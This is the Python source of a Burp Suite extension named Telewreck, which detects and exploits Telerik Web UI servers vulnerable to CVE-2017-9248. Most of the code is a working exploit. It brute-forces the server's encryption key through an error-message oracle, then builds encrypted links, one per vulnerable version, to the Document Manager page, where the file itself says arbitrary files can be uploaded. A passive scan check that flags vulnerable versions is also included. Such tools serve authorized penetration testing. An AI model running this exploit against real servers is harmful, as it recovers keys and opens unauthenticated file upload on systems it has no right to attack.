"""
Name:		Telewreck
Version:1.0
Author:		Capt. Meelo (@CaptMeelo) 
Description:	Telewreck is a Burp Suite extension used to detect and exploit instances of Telerik Web UI vulnerable to CVE-2017-9248.
		This is based on the work of Paul Taylor (@bao7uo) who provided the original PoC (https://github.com/bao7uo/dp_crypto). 
		Big thanks to him. 
"""

from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from burp import ITab
from javax import swing
from java.awt import Font, Color
from threading import Thread
from array import array
import re
import sys
import time
import binascii
import base64
import requests
requests.packages.urllib3.disable_warnings() 


banner = """   ______    __                       __  
  /_  __/__ / /__ _    _________ ____/ /__
   / / / -_) / -_) |/|/ / __/ -_) __/  '_/
  /_/  \__/_/\__/|__,__/_/  \__/\__/_/\_\  v1.0
"""

VULN_VERSIONS = ['2007.1423', '2007.1521', '2007.1626', '2007.2918', '2007.21010', '2007.21107', '2007.31218', 
		'2007.31314', '2007.31425', '2008.1415', '2008.1515', '2008.1619', '2008.2723', '2008.2826', 
		'2008.21001', '2008.31105', '2008.31125', '2008.31314', '2009.1311', '2009.1402', '2009.1527', 
		'2009.2701', '2009.2826', '2009.31103', '2009.31208', '2009.31314', '2010.1309', '2010.1415', 
		'2010.1519', '2010.2713', '2010.2826', '2010.2929', '2010.31109', '2010.31215', '2010.31317', 
		'2011.1315', '2011.1413', '2011.1519', '2011.2712', '2011.2915', '2011.31115', '2011.3.1305', 
                '2012.1.215', '2012.1.411', '2012.2.607', '2012.2.724', '2012.2.912', '2012.3.1016', '2012.3.1205', 
                '2012.3.1308', '2013.1.220', '2013.1.403', '2013.1.417', '2013.2.611', '2013.2.717', '2013.3.1015', 
                '2013.3.1114', '2013.3.1324', '2014.1.225', '2014.1.403', '2014.2.618', '2014.2.724', '2014.3.1024', 
                '2015.1.204', '2015.1.225', '2015.1.401', '2015.2.604', '2015.2.623', '2015.2.729', '2015.2.826', 
                '2015.3.930', '2015.3.1111', '2016.1.113', '2016.1.225', '2016.2.504', '2016.2.607', '2016.3.914', 
                '2016.3.1018', '2016.3.1027', '2017.1.118', '2017.1.228', '2017.2.503', '2017.2.621', '2017.2.711',
                '2017.3.913']


class BurpExtender(IBurpExtender, IScannerCheck, ITab):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Telewreck")
        callbacks.registerScannerCheck(self)
        self.initUI()
        self._callbacks.addSuiteTab(self)

        print "Telewreck successfully loaded."

    def initUI(self):
        self.tab = swing.JPanel()

        # UI for Decrypt Key
        self.decryptLabel = swing.JLabel("Decrypt Key:")
        self.decryptLabel.setFont(Font("Tahoma", Font.BOLD, 14))
        self.decryptLabel.setForeground(Color(255,102,52))
        self.urlLabel = swing.JLabel("URL:")
        self.urlTxtField = swing.JTextField("http://localhost/Telerik.Web.UI.DialogHandler.aspx", 40)
        self.charLabel = swing.JLabel("Character Set:")
        self.hexRadio = swing.JRadioButton("Hex", True)
        self.asciiRadio = swing.JRadioButton("ASCII", False)
        self.btnGroup = swing.ButtonGroup()
        self.btnGroup.add(self.hexRadio)
        self.btnGroup.add(self.asciiRadio)
        self.decryptBtn = swing.JButton("Decrypt Key", actionPerformed=self.mode_brutekey)
        self.cancelBtn = swing.JButton("Cancel", actionPerformed=self.cancel)

        # UI for Output
        self.outputLabel = swing.JLabel("Log:")
        self.outputLabel.setFont(Font("Tahoma", Font.BOLD, 14))
        self.outputLabel.setForeground(Color(255,102,52))
        self.logPane = swing.JScrollPane()
        self.outputTxtArea = swing.JTextArea()
        self.outputTxtArea.setFont(Font("Consolas", Font.PLAIN, 12))
        self.outputTxtArea.setLineWrap(True)
        self.logPane.setViewportView(self.outputTxtArea)
        self.clearBtn = swing.JButton("Clear Log", actionPerformed=self.clearLog)

        # Layout
        layout = swing.GroupLayout(self.tab)
        layout.setAutoCreateGaps(True)
        layout.setAutoCreateContainerGaps(True)
        self.tab.setLayout(layout)

        layout.setHorizontalGroup(
            layout.createParallelGroup()
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup()
                    .addComponent(self.decryptLabel)
                    .addComponent(self.urlLabel)
                    .addComponent(self.urlTxtField, swing.GroupLayout.PREFERRED_SIZE, swing.GroupLayout.DEFAULT_SIZE, swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(self.charLabel)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(self.hexRadio)
                        .addComponent(self.asciiRadio)
                    )
                    .addGroup(layout.createSequentialGroup()
                    	.addComponent(self.decryptBtn)
                    	.addComponent(self.cancelBtn)
                    )
                )
                .addGroup(layout.createParallelGroup()
                    .addComponent(self.outputLabel)
                    .addComponent(self.logPane)
                    .addComponent(self.clearBtn)
                )
            )
        )
        
        layout.setVerticalGroup(
            layout.createParallelGroup()
            .addGroup(layout.createParallelGroup()
                .addGroup(layout.createSequentialGroup()
                    .addComponent(self.decryptLabel)
                    .addComponent(self.urlLabel)
                    .addComponent(self.urlTxtField, swing.GroupLayout.PREFERRED_SIZE, swing.GroupLayout.DEFAULT_SIZE, swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(self.charLabel)
                    .addGroup(layout.createParallelGroup()
                        .addComponent(self.hexRadio)
                        .addComponent(self.asciiRadio)
                    )
                    .addGroup(layout.createParallelGroup()
	                    .addComponent(self.decryptBtn)
	                    .addComponent(self.cancelBtn)
                    )
                )
                .addGroup(layout.createSequentialGroup()
                    .addComponent(self.outputLabel)
                    .addComponent(self.logPane)
                    .addComponent(self.clearBtn)
                )
            )
        )

    def getTabCaption(self):
        return "Telewreck"

    def getUiComponent(self):
        return self.tab


    #### START OF DECRYPT KEY
    def encrypt(self, dpdata, key):
        encrypted = []
        k = 0

        for i in range(len(dpdata)):
            encrypted.append(chr(ord(dpdata[i]) ^ ord(key[k])))
            k = 0 if k >= len(key) - 1 else k + 1
        return ''.join(str(e) for e in encrypted)

    def get_result(self, plaintext, key, session, pad_chars):
        global requests_sent, char_requests

        url = URL
        base_pad = (len(key) % 4)
        base = "" if base_pad == 0 else pad_chars[0:4 - base_pad]
        dp_encrypted = base64.b64encode((self.encrypt(plaintext, key) + base).encode()).decode()
        request = requests.Request("GET", url + "?dp=" + dp_encrypted)
        request = request.prepare()
        response = session.send(request, verify=False)
        requests_sent += 1
        char_requests += 1

        match = re.search("(Error Message:)(.+\n*.+)(</div>)", response.text)
        return True if match is not None and match.group(2) == "Index was outside the bounds of the array." else False

    def test_keychar(self, keychar, found, session, pad_chars):
        base64chars = [ "A", "Q", "g", "w", "B", "R", "h", "x", "C", "S", "i", "y", "D", "T", "j", "z", 
                        "E", "U", "k", "0", "F", "V", "l", "1", "G", "W", "m", "2", "H", "X", "n", "3", 
                        "I", "Y", "o", "4", "J", "Z", "p", "5", "K", "a", "q", "6", "L", "b", "r", "7",
                        "M", "c", "s", "8", "N", "d", "t", "9", "O", "e", "u", "+", "P", "f", "v", "/" ]

        duff = False
        accuracy_thoroughness_threshold = ACCURACY

        for bc in range(int(accuracy_thoroughness_threshold)):
            if not self.get_result(base64chars[0]*len(found)+base64chars[bc], found+keychar, session, pad_chars):
                duff = True
                break
        return False if duff else True

    def test_keypos(self, key_charset, unprintable, found, session):
        pad_chars = ""

        for pad_char in range(256):
            pad_chars += chr(pad_char)

        for i in range(len(pad_chars)):
            for k in range(len(key_charset)):
                keychar = key_charset[k]
                if self.test_keychar(keychar, found, session, pad_chars[i] * 3):
                    return keychar
        return False


    def get_key(self, session):
        global char_requests, requests_sent, found, key_charset, ACCURACY, RUNNING

        requests_sent = 0
        char_requests = 0
        found = ""
        unprintable = False
        key_length = "48"
        RUNNING = True
        
        if self.hexRadio.isSelected():    
            key_charset = "hex"
            ACCURACY = "9"
        else:
            key_charset = "ascii"
            ACCURACY = "21"

        if key_charset == "ascii":
            unprintable = True
            key_charset = ""
            for i in range(256):
                key_charset += chr(i)
                charset = "All printable ASCII"

        elif key_charset == "hex":
            key_charset = "01234567890ABCDEF"
            charset = "Hex [01234567890ABCDEF]"

        time.sleep(0.5)
        self.outputTxtArea.append("[*] Target URL: " + URL + "\n")
        self.outputTxtArea.append("[*] Character Set: " + charset +"\n\n")

        self.outputTxtArea.append("[!] Bruteforce has started...\n")
        self.outputTxtArea.append("[!] This may take awhile. Have some coffee first...\n\n")
        time.sleep(1.5)

        while RUNNING:
            for i in range(int(key_length)):
                pos_str = (str(i + 1) if i > 8 else "0" + str(i + 1))

                self.outputTxtArea.append("[+] Key Position " + pos_str + ": ")
                keychar = self.test_keypos(key_charset, unprintable, found, session)

                if RUNNING == False:
                    sys.exit() 

                if keychar is not False:
                    found = found + keychar
                    self.outputTxtArea.append("[" + (keychar if not unprintable else '0x' + binascii.hexlify(keychar.encode()).decode()) + "] found with " + str(char_requests) + " requests.\n")
                    char_requests = 0
                else:
                    self.outputTxtArea.append("[-] Not found, quitting\n")
                    break

            self.outputTxtArea.append("\n[*] Total Web Requests: " + str(requests_sent) + "\n")

            if keychar is not False:
                self.outputTxtArea.append("[+] Decrypted Key: " + (found if not unprintable else "(hex) " + binascii.hexlify(found.encode()).decode()) + "\n\n")

            if found == "":
                return
            else:
                urls = {}
                url_path = URL
                params = "?DialogName=DocumentManager&renderMode=2&Skin=Default&Title=Document%20Manager&dpptn=&isRtl=false&dp="
                plaintext1 = "EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,"
                plaintext2_raw1 = "Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version="
                plaintext2_raw3 = ", Culture=neutral, PublicKeyToken=121fae78165ba3d4"
                plaintext3 = ";AllowMultipleSelection,False,3,False"

                for version in VULN_VERSIONS:
                    plaintext2_raw2 = version
                    plaintext2 = base64.b64encode((plaintext2_raw1 + plaintext2_raw2 + plaintext2_raw3).encode()).decode()
                    plaintext = plaintext1 + plaintext2 + plaintext3
                    plaintext = base64.b64encode(plaintext.encode()).decode()
                    ciphertext = base64.b64encode(self.encrypt(plaintext, found).encode()).decode()
                    full_url = url_path + params + ciphertext
                    urls[version] = full_url

                found_valid_version = False

                for version in urls:
                    url = urls[version]
                    request = requests.Request('GET', url)
                    request = request.prepare()
                    response = session.send(request, verify=False)

                    if response.status_code == 500:
                        continue
                    else:
                        match = re.search("(Error Message:)(.+\n*.+)(</div>)", response.text)
                        if match is None:
                            self.outputTxtArea.append("[+] Version Exploited: " + version + "\n")
                            self.outputTxtArea.append("[+] Document Manager Link: " + url + "\n")
                            found_valid_version = True
                            break

                if not found_valid_version:
                    self.outputTxtArea.append("[-] No valid version found")

            self.outputTxtArea.append("\n[!] Exiting....")
            sys.exit()

    def mode_brutekey(self, event):
        self.outputTxtArea.setText(banner + "\n\n")

        global URL
        URL = self.urlTxtField.getText()

        session = requests.Session()
        thread = Thread(target=self.get_key, args=(session,))
        thread.daemon = True
        thread.start()

    def cancel(self, event):
        global RUNNING
        RUNNING = False
        
    	self.outputTxtArea.append("\n\n[!] Cancelled!\n")
    #### END OF DECRYPT KEY

    def clearLog(self, event):
        self.outputTxtArea.setText("")

    def _get_matches(self, response, match):
        matches = []
        start = 0
        reslen = len(response)
        matchlen = len(match)
        while start < reslen:
            start = self._helpers.indexOf(response, match, True, start, reslen)
            if start == -1:
                break
            matches.append(array('i', [start, start + matchlen]))
            start += matchlen

        return matches

    def doPassiveScan(self, baseRequestResponse):
        matches = self._get_matches(baseRequestResponse.getResponse(), "Telerik.Web.UI")
        if (len(matches) > 0):
            for i in range(len(VULN_VERSIONS)):
                matches = self._get_matches(baseRequestResponse.getResponse(), bytearray(VULN_VERSIONS[i]))
                if (len(matches) > 0):
                    text = ("<p>Telerik Web UI version <strong>" + VULN_VERSIONS[i] + "</strong> suffers from a" 
                            " cryptographic weakness which could allow unauthenticated remote attacker to" 
                            " defeat the cryptographic protection mechanism, leading to the disclosure of" 
                            " encryption key and discovery of the encrypted link used to access the" 
                            " <strong>Document Manager</strong> page, where arbitrary files could be uploaded.</p>"
                            "<p> See <a href='https://www.cvedetails.com/cve/CVE-2017-9248/'>CVE-2017-9248</a>"
                            " for further information.</p>"
                            )
            return [CustomScanIssue(
                baseRequestResponse.getHttpService(),
                self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                [self._callbacks.applyMarkers(baseRequestResponse, None, matches)],
                "Vulnerable Telerik Web UI version found",
                text,
                "High")]

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1
        else:
            return 0

class CustomScanIssue (IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
